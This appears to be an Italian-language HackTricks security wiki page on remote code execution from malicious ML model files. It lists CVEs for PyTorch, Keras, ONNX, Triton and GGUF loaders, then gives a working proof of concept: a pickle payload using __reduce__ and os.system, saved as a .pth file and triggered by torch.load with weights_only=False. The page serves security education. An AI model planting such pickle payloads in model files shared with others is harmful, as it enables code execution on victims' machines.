# Modelli RCE

{{#include ../banners/hacktricks-training.md}}

## Caricamento modelli per RCE

I modelli di Machine Learning sono solitamente condivisi in diversi formati, come ONNX, TensorFlow, PyTorch, ecc. Questi modelli possono essere caricati nelle macchine degli sviluppatori o nei sistemi di produzione per essere utilizzati. Di solito, i modelli non dovrebbero contenere codice malevolo, ma ci sono alcuni casi in cui il modello può essere utilizzato per eseguire codice arbitrario sul sistema come funzionalità prevista o a causa di una vulnerabilità nella libreria di caricamento del modello.

Al momento della scrittura, questi sono alcuni esempi di questo tipo di vulnerabilità:

| **Framework / Strumento**   | **Vulnerabilità (CVE se disponibile)**                                                                                       | **Vettore RCE**                                                                                                                        | **Riferimenti**                             |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|---------------------------------------------|
| **PyTorch** (Python)        | *Deserializzazione insicura in* `torch.load` **(CVE-2025-32434)**                                                          | Pickle malevolo nel checkpoint del modello porta all'esecuzione di codice (bypassando la protezione `weights_only`)                     | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + download di modello malevolo causa esecuzione di codice; deserializzazione RCE in API di gestione                                 | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML non sicuro) <br> **CVE-2024-3660** (Keras Lambda)                                                  | Caricamento del modello da YAML utilizza `yaml.unsafe_load` (esecuzione di codice) <br> Caricamento del modello con layer **Lambda** esegue codice Python arbitrario | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (analisi TFLite)                                                                                         | Modello `.tflite` creato provoca overflow intero → corruzione dell'heap (potenziale RCE)                                               | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                          | Caricamento di un modello tramite `joblib.load` esegue pickle con il payload `__reduce__` dell'attaccante                              | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *contestato*                                                                           | `numpy.load` di default consentiva array di oggetti pickle – `.npy/.npz` malevoli provocano esecuzione di codice                      | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversal di directory) <br> **CVE-2024-5187** (traversal tar)                                         | Il percorso dei pesi esterni del modello ONNX può uscire dalla directory (leggere file arbitrari) <br> Modello ONNX malevolo tar può sovrascrivere file arbitrari (portando a RCE) | |
| ONNX Runtime (rischio di design) | *(Nessun CVE)* operazioni personalizzate ONNX / flusso di controllo                                                        | Modello con operatore personalizzato richiede il caricamento del codice nativo dell'attaccante; grafi di modello complessi abusano della logica per eseguire calcoli non intenzionati | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversal di percorso)                                                                                  | Utilizzando l'API di caricamento del modello con `--model-control` abilitato consente la traversata di percorso relativo per scrivere file (ad es., sovrascrivere `.bashrc` per RCE) | |
| **GGML (formato GGUF)**     | **CVE-2024-25664 … 25668** (molti overflow dell'heap)                                                                       | File di modello GGUF malformato provoca overflow del buffer dell'heap nel parser, abilitando l'esecuzione di codice arbitrario sul sistema vittima | |
| **Keras (formati più vecchi)** | *(Nessun nuovo CVE)* Modello Keras H5 legacy                                                                                | Modello HDF5 (`.h5`) malevolo con codice Lambda layer continua a eseguire al caricamento (Keras safe_mode non copre il formato vecchio – “attacco di downgrade”) | |
| **Altri** (generale)        | *Difetto di design* – Serializzazione Pickle                                                                                 | Molti strumenti ML (ad es., formati di modello basati su pickle, `pickle.load` di Python) eseguiranno codice arbitrario incorporato nei file modello a meno che non venga mitigato | |

Inoltre, ci sono alcuni modelli basati su pickle di Python, come quelli utilizzati da [PyTorch](https://github.com/pytorch/pytorch/security), che possono essere utilizzati per eseguire codice arbitrario sul sistema se non vengono caricati con `weights_only=True`. Quindi, qualsiasi modello basato su pickle potrebbe essere particolarmente suscettibile a questo tipo di attacchi, anche se non è elencato nella tabella sopra.

Esempio:

- Crea il modello:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carica il modello:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
{{#include ../banners/hacktricks-training.md}}
